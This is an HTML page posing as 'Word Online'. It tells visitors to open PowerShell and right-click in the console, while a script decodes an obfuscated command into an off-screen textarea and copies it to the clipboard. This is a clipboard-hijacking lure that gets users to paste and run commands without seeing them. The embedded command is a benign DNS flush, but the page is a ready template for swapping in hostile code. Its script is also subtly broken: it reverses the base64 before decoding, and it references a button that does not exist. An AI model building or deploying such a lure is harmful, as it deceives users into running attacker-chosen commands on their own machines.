<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Word Online</title>
<script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
</head>
<body>
<div id="prompt">
1. Right-click the Start button and run "Windows PowerShell" ("Windows Terminal").<br>
2. Right-click in the console window.<br>
Wait for the operation to complete and reload the page.<br>
</div>
<textarea id="code" cols="1" rows="1" style="margin: -10000px;"></textarea>
<script>
function reverse(s)
{
	return s.split("").reverse().join("");
}
$(document).ready(function()
{
	var payload = atob(reverse("aXBjb25maWcgL2ZsdXNoZG5zDQo="));
	$("#code").val(payload);
});
document.getElementById("fix").addEventListener("click", function()
{
	var codeInput = document.getElementById("code");
	codeInput.select();
	document.execCommand("copy");
	window.getSelection().removeAllRanges();
});
</script>
</body>
</html>
